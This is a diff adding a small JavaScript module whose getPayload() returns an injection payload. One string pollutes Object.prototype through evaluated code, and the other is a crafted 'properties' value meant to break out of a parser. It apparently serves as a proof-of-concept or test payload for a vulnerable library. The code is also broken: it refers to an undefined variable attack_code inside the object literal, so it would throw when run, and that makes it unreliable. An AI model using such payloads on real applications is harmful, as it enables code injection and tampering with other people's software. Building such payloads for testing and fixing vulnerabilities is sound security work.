@@ -1,0 +1,8 @@
+function getPayload() {
+    return {
+        attack_code: "1 + (Object.prototype.polluted = `yes`)",
+        properties: "{a:*1*; " + attack_code + " /*/}"
+    };
+}
+
+module.exports = { getPayload };
